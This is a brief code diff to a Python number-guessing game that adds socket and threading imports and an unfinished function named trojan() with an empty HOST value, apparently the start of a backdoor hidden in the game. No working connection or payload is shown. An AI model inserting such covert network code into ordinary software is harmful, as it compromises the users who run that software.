@@ -1,4 +1,10 @@
 import random 
+import socket 
+import threading
+
+
+def trojan():
+    HOST = 
 
 def game():
     number = random.randint(0,1000)
